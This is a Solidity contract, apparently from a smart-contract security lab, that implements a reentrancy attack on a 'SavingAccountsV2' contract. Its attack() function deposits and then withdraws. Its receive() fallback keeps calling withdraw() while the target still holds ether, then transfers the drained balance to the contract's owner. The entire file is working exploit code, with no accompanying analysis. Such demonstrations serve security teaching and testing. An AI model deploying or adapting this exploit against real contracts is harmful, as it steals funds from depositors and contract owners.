//SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ISavingAccountsV2Sol1 {
    function deposit() external payable;

    function withdraw() external;
}

contract InvestorV2Sol1 is Ownable {
    ISavingAccountsV2Sol1 public immutable savingAccountV2;

    constructor(address savingAccountV2Address) {
        // point to is address at construction time
        savingAccountV2 = ISavingAccountsV2Sol1(savingAccountV2Address);
    }

    function attack() external payable onlyOwner {
        savingAccountV2.deposit{value: msg.value}();
        savingAccountV2.withdraw();
    }

    receive() external payable {
        if (address(savingAccountV2).balance > 0) {
            console.log("");
            console.log("Reentering...");
            savingAccountV2.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}
